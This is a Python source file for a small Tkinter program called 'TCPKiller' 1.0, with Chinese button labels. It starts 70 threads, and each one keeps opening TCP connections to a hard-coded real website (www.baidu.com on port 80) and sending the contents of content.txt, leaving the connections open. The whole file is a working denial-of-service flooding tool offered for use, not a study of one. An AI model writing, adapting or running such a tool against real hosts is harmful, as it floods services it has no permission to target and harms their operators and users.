#coding=utf-8
import socket
import threading
import time
from tkinter import *

shouldq=0
xs=10 #x-size
ys=7 #y-size
t=1 #error-delay-time
host='www.baidu.com' #target-hostname
port=80 #target-port
ver='1.0' #version

def k(y,x):
    global shouldq
    sta[y][x]['text']='＝＝'
    try:
        while shouldq==0:
            try:
                s=socket.socket()
                s.connect((host,port))
                s.send(content)
                #s.close()
            except (OSError,ConnectionRefusedError,TimeoutError):
                if shouldq==1:
                    sta[y][x]['text']='　　'
                    return
                sta[y][x]['text']='！！'
                time.sleep(t)
                sta[y][x]['text']='＝＝'
            else:
                if shouldq==1:
                    sta[y][x]['text']='　　'
                    return
                if sta[y][x]['text']=='－－':
                    sta[y][x]['text']='＋＋'
                else:
                    sta[y][x]['text']='－－'
        sta[y][x]['text']='　　'
        return
    except:
        raise################
        return

def st():
    global shouldq
    shouldq=0
    if threading.activeCount()>2:
        messagebox.showwarning('TCPKiller',
                               str(threading.activeCount()-2)+'个线程已在运行')
    for y in range(ys):
        for x in range(xs):
            t=threading.Thread(target=k,args=(y,x))
            t.setDaemon(True)
            t.start()
def kill():
    global shouldq
    shouldq=1

def test():
    try:
        s=socket.socket()
        s.connect((host,port))
        s.send(content)
        s.close()
    except (ConnectionRefusedError,TimeoutError) as e:
        messagebox.showwarning('TCPKiller',str(e))
    except:
        messagebox.showerror('TCPKiller','未知错误')
        raise
    else:
        messagebox.showinfo('TCPKiller','测试成功')
    

tk=Tk()
sta=[[0 for col in range(xs)] for row in range(ys)]
for y in range(ys):
    for x in range(xs):
        sta[y][x]=Button(tk,text='　　')
        sta[y][x].grid(column=x,row=y)
bs=Button(tk,text='开始',command=st)
bs.grid(column=xs+1,row=0)
bk=Button(tk,text='结束',command=kill)
bk.grid(column=xs+1,row=1)
bk=Button(tk,text='测试',command=test)
bk.grid(column=xs+1,row=2)
tk.title('TCPKiller '+ver)

try:
    f=open('content.txt','br')
    content=f.read()
    f.close()
except:
    content=''

mainloop()
kill()
